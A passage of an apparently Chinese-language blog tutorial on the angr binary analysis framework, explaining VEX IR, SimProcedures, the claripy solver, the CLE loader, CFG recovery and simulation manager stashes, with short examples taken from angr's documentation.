stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://web.wpi.edu/Pubs/E-project/Available/E-project-101816-114710/unrestricted/echeng_mqp_angr.pdf">https://web.wpi.edu/Pubs/E-project/Available/E-project-101816-114710/unrestricted/echeng_mqp_angr.pdf</a></p></blockquote><p>​        angr一般优势在于可以为逆向工程查找函数，生成函数调用图，同时其还具备一个符号执行引擎。上述研究项目为angr研究设置了三个目标：</p><ol><li>探索angr的符号执行能力并记录其复杂性。</li><li>探索Angr作为二进制分析工具的能力。</li><li>为angr创建一个平台，使得逆向工程师更容易接触他们。</li></ol><p>从这三个目标来看，这是一个非常适合新手学习angr的项目，展示的都是很基本的功能。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://archive.fosdem.org/2017/schedule/event/valgrind_angr/attachments/slides/1797/export/events/attachments/valgrind_angr/slides/1797/slides.pdf">https://archive.fosdem.org/2017/schedule/event/valgrind_angr/attachments/slides/1797/export/events/attachments/valgrind_angr/slides/1797/slides.pdf</a></p></blockquote><p>这个（应该）是Angr团队的一个演讲，讲的更好一点，可以理解一下Angr的底层实现。</p><h3 id="vex"><a href="#vex" class="headerlink" title="vex"></a>vex</h3><p>​        angr用VEX作为中间表示用来进行二进制分析，pyVEX就是一个对于VEX的python封包。其实中间语言存在于很多场合，最主要的功能是为了解决二进制分析中面临多种架构的问题，使得一次分析可以运行在多个架构之上。最主要的中间表示如下：</p><ul><li>Register name，VEX models 存放寄存器在一个单独的内存空间里面，用offset来定位不同的寄存器。</li><li>Mem access.</li><li>Mem segmentation.</li><li>Instruction side-effects. 很多指令具备Side-effects。比如push pop同时还会影响stack pointer, thumb mode on arm很多指令都影响flags。IR可以相应的表示这些影响。</li></ul><p>VEX主要存在以下结构，这个非常重要：</p><ul><li><strong>Expressions.</strong> IR Expressions represent a calculated or constant value. This includes memory loads, register reads, and results of arithmetic operations.</li><li><strong>Operations.</strong> IR Operations describe a <em>modification</em> of IR Expressions. This includes integer arithmetic, floating-point arithmetic, bit operations, and so forth. An IR Operation applied to IR Expressions yields an IR Expression as a result.</li><li><strong>Temporary variables.</strong> VEX uses temporary variables as internal registers: IR Expressions are stored in temporary variables between use. The content of a temporary variable can be retrieved using an IR Expression. These temporaries are numbered, starting at <code>t0</code>. These temporaries are strongly typed (i.e., “64-bit integer” or “32-bit float”).</li><li><strong>Statements.</strong> IR Statements model changes in the state of the target machine, such as the effect of memory stores and register writes. IR Statements use IR Expressions for values they may need. For example, a memory store <em>IR Statement</em> uses an <em>IR Expression</em> for the target address of the write, and another <em>IR Expression</em> for the content.</li><li><strong>Blocks.</strong> An IR Block is a collection of IR Statements, representing an extended basic block (termed “IR Super Block” or “IRSB”) in the target architecture. A block can have several exits. For conditional exits from the middle of a basic block, a special <em>Exit</em> IR Statement is used. An IR Expression is used to represent the target of the unconditional exit at the end of the block.</li></ul><p>上面可以了解angr的一些基本概念。详细例子可以参考下面：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://github.com/angr/pyvex">https://github.com/angr/pyvex</a></p><p>这些语言描述是很难的，建议还是根据官方例子调试一下，就知道每个IR对应的意思了。</p></blockquote><p>​        下图在angr团队的演讲里面展示的，正是对应的上述的VEX结构。因此可以看出pyvex可以很好的把机器码转换为中间语言来方便进行二进制分析。对于所有的vex struct都对应的有python class和enums，这些都以字符串的形式表示，总的来说就是整个的中间表示能力都可以用python完成。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/image-20230129102429515.fpox4v69egg.png"></p><p>在Angr里面还存在SimuVEX，这是为了符号执行，它本身是作为VEX IR（IRSBs）的符号执行引擎：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/image-20230129143824974.79qf2n61i14.png"></p><p>符号执行的一个核心在于执行环境的实现，因此SimuVEX必须实现：</p><ol><li>内存和寄存器建模。</li><li>syscalls</li><li>Files and other data sources from outside the program</li><li>Providing symbolic summaries (SimProcedures) of common library functions</li></ol><p>这里面比较难以理解的就是symbolic summaries了，先看下angr官方的例子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">from</span> angr <span class="token keyword">import</span> Project<span class="token punctuation">,</span> SimProcedure<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> project <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'examples/fauxware/fauxware'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">class</span> <span class="token class-name">BugFree</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Program running with argc=%s and argv=%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token comment"># this assumes we have symbols for the binary</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'main'</span><span class="token punctuation">,</span> BugFree<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Run a quick execution!</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> simgr<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># step until no more active states</span>Program running <span class="token keyword">with</span> argc<span class="token operator">=</span><span class="token operator">&lt;</span>SAO <span class="token operator">&lt;</span>BV64 <span class="token number">0x0</span><span class="token operator">&gt;&gt;</span> <span class="token keyword">and</span> argv<span class="token operator">=</span><span class="token operator">&lt;</span>SAO <span class="token operator">&lt;</span>BV64 <span class="token number">0x7fffffffffeffa0</span><span class="token operator">&gt;&gt;</span><span class="token operator">&lt;</span>SimulationManager <span class="token keyword">with</span> <span class="token number">1</span> deadended<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出SimProcedures的一个核心作用就是hook，这里main函数不再执行，而是执行我们定义的SimProcedures，这意味着可以定义程序的运行。因此上述的4应该就是提供对于库函数的替代，这样的一个好处也在于提升了符号执行的性能。如果想对SimuVEX有一个更好的了解可以参考下面的文章，来从源代码进行理解：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://sites.google.com/site/bletchleypark2/malware-analysis/angr/simuvex">https://sites.google.com/site/bletchleypark2/malware-analysis/angr/simuvex</a></p><p>如果打算做符号执行的话，还是深入读一下，这一块是对执行过程state的很核心的代码。</p></blockquote><h3 id="claripy"><a href="#claripy" class="headerlink" title="claripy"></a>claripy</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>这个玩意挺难，挺复杂的。</p><p><a href="https://docs.angr.io/advanced-topics/claripy#solvers">https://docs.angr.io/advanced-topics/claripy#solvers</a></p></blockquote><p>​        claripy是Angr的一个约束求解引擎，主要的设计思想如下：</p><ul><li>Claripy ASTs 提供一个统一的方式和符号化的或者具体化的表达式交互。</li></ul><p>在claripy里面实现了bitvectors，这使得我们可以在变量上构建表达式符号树，对它们的值添加约束然后求解它们具体的值，这个操作依赖z3。Claripy ASTs抽象了claripy支持的不同数学结构之间的差异，实现了很多处理操作，同时还实现了求解器。求解器可以说是Claripy最主要的功能，Solvers暴露api和ASTs以不同的方式进行交互并且返回可用的值，同时其具备不同的求解器类型以满足不同的要求。通过Claripy Backends可以构建自定义求解器，但是这将非常硬核。</p><h3 id="symbolic-execution-example"><a href="#symbolic-execution-example" class="headerlink" title="symbolic execution example"></a>symbolic execution example</h3><p>​        符号执行的一个特色就是状态复制，这也是路径爆炸问题的一个根本来源，状态复制指的是在符号执行的过程中如果state A遇到一个if else分支结构，那么就会复制出来两个状态对应不同的分支。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/image-20230129155912108.44opsvkouco0.png"></p><p>不同的state会添加不同的约束，然后最后求解的时候就是对这些约束进行求解。</p><h3 id="CLE"><a href="#CLE" class="headerlink" title="CLE"></a>CLE</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://www.anquanke.com/post/id/231591https://www.anquanke.com/post/id/231591">https://www.anquanke.com/post/id/231591https://www.anquanke.com/post/id/231591</a></p><p>（上面的好像关了。。。）</p><p><a href="https://github.com/angr/cle">https://github.com/angr/cle</a></p></blockquote><p>​        CLE主要表现为一个binary loader，但是其非常复杂，通过其可以将可执行文件和libraries文件载入到可用的地址空间，其复杂性来源于为不同平台，不同架构设计了统一的加载接口。这个里面最重要的其实就是VEX IR，VEX IR利用中间语言的方式抽象了机器代码的表示形式，同时消除不同体系结构之间的差异：</p><ol><li>寄存器名称。</li><li>内存访问</li><li>内存分段</li><li>具有副作用的指令，比如push pop</li></ol><h3 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h3><p>​        这是angr的核心分析模块，它将所有的抽象结合在一起形成一个统一的控制接口Project，这将实现非常便利的访问符号执行，CFG恢复，data-flow分析等等。但是这需要大量的基础知识来帮助完成理解。</p><p>​        在对于Angr的CFG进行理解的时候也不能完全按照ida的模式去理解:</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://docs.angr.io/introductory-errata/faq#why-is-angrs-cfg-different-from-idas">https://docs.angr.io/introductory-errata/faq#why-is-angrs-cfg-different-from-idas</a></p></blockquote><p>id不会再function call的地方拆分block，但是angr会，所以angr每次的step可能会因为function call进入下一个基本块。IDA侧重于提供更好的分析体验，而angr则侧重于自动化分析，在自动化分析过程中一般不需要超图，因为自动化分析一般想要的是更细致的内容。如果一个类似jump的跳转返回到基本块中间，ida一般会拆分，但是angr不会，因为很多静态分析一般不需要，但是可以通过生成cfg的过程中传递<code>normalize=True</code> 参数来开启拆分功能。</p><h3 id="Simulation-Managers"><a href="#Simulation-Managers" class="headerlink" title="Simulation Managers"></a>Simulation Managers</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://github.com/angr/angr-doc/blob/master/docs/pathgroups.md#simulation-managers">https://github.com/angr/angr-doc/blob/master/docs/pathgroups.md#simulation-managers</a></p></blockquote><p>​        angr分析模块里面最重要的control interface就是SimulationManager了，它可以同时控制状态组的符号执行，执行不同的搜索策略来探索程序的state空间。在符号执行的过程中，States会被组织成stashes，这使得分析人员可以step forward, filter, merge, and move around as you wish，甚至同时以不同的方式指向两种不同的stash集合并对其进行合并，默认操作的的stash是active。之前已经了解到angr可能存在很多states在stash里面，这些state可以通过move切换，move存在三个参数from_stash, to_stash, and filter_func用来对states进行filter和移动。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> simgr<span class="token punctuation">.</span>move<span class="token punctuation">(</span>from_stash<span class="token operator">=</span><span class="token string">'deadended'</span><span class="token punctuation">,</span> to_stash<span class="token operator">=</span><span class="token string">'authenticated'</span><span class="token punctuation">,</span> filter_func<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token string">b'Welcome'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> simgr<span class="token operator">&lt;</span>SimulationManager <span class="token keyword">with</span> <span class="token number">2</span> authenticated<span class="token punctuation">,</span> <span class="token number">1</span> deadended<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过上述操作我们创建一个新的stash。同时必须记得，state其实就是一个list，可以通过索引访问或者迭代等其它方法访问，比如利用<code>one_</code> 或者 <code>mp_</code>前缀，但是mp前缀返回给你的是一个 <a href="https://github.com/zardus/mulpyplexer">mulpyplexed</a> version of the stash.对于stash也存在一些特殊类型，如下：</p><ol><li>active和deadended。这两个比较容易理解，一个是当前使用的stash一个是里面包含的已经没办法继续执行的state。</li><li>pruned,  state可以通过Options进行调整，每一个state存在一个state.options，它们控制着angr 执行引擎的行为，当options中添加LAZY_SOLVES的时候，states在运行的时候不会检查满意度（satisfiability 指的是solver在求解前的测试，看看约束或者其他信息能否满足求解需要，如果返回true，接下来进行求解），除非非常必要的情况下才会进行检查，当该state unsat的时候， 遍历所有的state层级去识别历史上什么时候最初变得unsat，所有的继承于最初unsat点的state都将被放入pruned 集合。</li><li>save_unconstrained option如果被指定，所有被确定为无法约束的状态都会被放入这里。</li><li>Unsat，如果save_unsat option被指定，那么所有的unsatisfiable state都被放在这个集合，大多数的原因可能是具备相互矛盾的约束。</li><li>errored，如果state在执行过程中遇到raise error，该state被打包进入ErrorRecord object，这其中还包括raised error，然后放入errord集合.<ol><li>You can get at the state as it was at the beginning of the execution tick that caused the error with <code>record.state</code>, you can see the error that was raised with <code>record.error</code>, and you can launch a debug shell at the site of the error with <code>record.debug()</code>. This is an invaluable debugging tool!</li></ol></li></ol><h3 id="Exploration-Techniques"><a href="#Exploration-Techniques" class="headerlink" title="Exploration Techniques"></a>Exploration Techniques</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 